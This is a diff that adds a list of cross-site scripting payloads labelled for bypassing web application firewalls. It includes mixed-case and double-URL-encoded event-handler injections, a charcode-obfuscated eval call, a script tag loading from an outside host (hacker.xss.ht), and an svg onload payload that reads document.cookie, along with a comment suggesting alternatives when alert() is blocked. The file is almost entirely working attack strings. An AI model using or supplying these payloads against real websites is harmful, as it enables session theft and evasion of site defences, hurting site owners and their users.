@@ -1,0 +1,21 @@
+#bypass waf payload 
+"><input%252bTyPE%25253d"hxlxmj"%252bSTyLe%25253d"display%25253anone%25253b"%252bonfocus%25253d"this.style.display%25253d'block'%25253b%252bthis.onfocus%25253dnull%25253b"%252boNMoUseOVer%25253d"this['onmo'%25252b'useover']%25253dnull%25253beval(String.fromCharCode(99,111,110,102,105,114,109,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))%25253b"%252bAuToFOcus>
+
+ '"><script src=https://hacker.xss.ht></script>'
+
+- 1'"();<test><ScRiPt >alert("XSS_WAF_BYPASS")</ScRiPt> 
+
+- 1'"();<test><ScRiPt >window.alert("XSS_WAF_BYPASS")</ScRiPt>
+
+#if the alert() function will be blocked, but remember that you have other functions like confirm(), prompt(), #window.alert(), window.confirm(), window.prompt() .
+
+xss'"><iframe srcdoc='%26lt;script>;alert(1)%26lt;/script>'>
+
+--><a"/onclick=(confirm)()>elcezeri!
+
+<details%0Aopen%0AonToGgle%0A=%0Aabc=(co\u006efirm);abc%28%60xss%60%26%2300000000000000000041//
+
+"`'><script>\xE2\x80\x87javascript:alert(1)</script>
+
+<svg onload=alert&#0000000040document.cookie)>
+
